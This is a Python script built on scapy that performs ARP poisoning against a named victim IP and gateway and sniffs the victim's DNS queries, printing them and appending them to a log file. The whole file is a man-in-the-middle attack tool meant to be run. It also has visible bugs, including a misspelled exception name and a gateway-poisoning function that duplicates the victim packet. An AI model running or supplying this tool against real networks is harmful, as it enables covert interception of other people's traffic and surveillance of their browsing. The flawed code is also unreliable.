from scapy.all import *
import threading
import os
import sys
import argparse

# Man in the middle


# We need several args: 
# --vip or -v is the victim ip
# --gip or -g is the gateway ip
# --interface or -i is the interface used

parser = argparse.ArgumentParser(description='Write informations about the victim')
parser.add_argument('--vip','-v', metavar='ip', type=str, required=True,
                    help='Address IP of the victim')

parser.add_argument('--gip', '-g', metavar='ip', type=str, required=True,
                    help='Address IP of the gateway')

parser.add_argument('--interface', '-i', metavar='name', type=str, required=True,
                    help='Name of the used interface')

args = parser.parse_args()

# init all variables needed

VIP = args.vip
GIP = args.gip
INT = args.interface

print("Please, verify you are running this script in sudo mode\n")
print("You can also see the log on the log.txt file\n")
print ("Poisoning Victim: " + VIP)
print("\n")

class bcolors:
    BLUE = '\033[94m'
    GREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    END = '\033[0m'

def dnshandle(packet):
    if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0:
        LOG = open('log.txt', 'a+')
        print('Victim: ' + bcolors.BLUE + VIP + bcolors.END + ' has searched for: ' + bcolors.GREEN + packet.getlayer(DNS).qd.qname + bcolors.END)
        LOG.write('Victim: ' + VIP + ' has searched for: ' + packet.getlayer(DNS).qd.qname)
        LOG.write('\n')
        LOG.close()
 
def vip_poison():
    vpoison = ARP(pdst=VIP, psrc=GIP)
    while True:
        try:   
            send(vpoison,verbose=0, inter=1, loop=1) # Function constructing and sending the ARP packets
        except KeyboardInterupt:
            sys.exit(1)

def gip_poison():
    gpoison = ARP(pdst=VIP, psrc=GIP)
    while True:
        try:
            send(gpoison, verbose=0, inter=1, loop=1)
        except KeyboardInterrupt:
            sys.exit(1)

vipthread = []
gipthread = []
    
def main():
    while True:
        try:
            vpoison = threading.Thread(target=vip_poison)
            vpoison.setDaemon(True)
            vipthread.append(vpoison)
            vpoison.start()        
            
            gpoison = threading.Thread(target=gip_poison)
            gpoison.setDaemon(True)
            gipthread.append(gpoison)
            gpoison.start()

            packet = sniff(iface=INT, filter='udp port 53', prn=dnshandle)

        except KeyboardInterrupt:
                sys.exit(1)

if __name__ == '__main__':
    main()


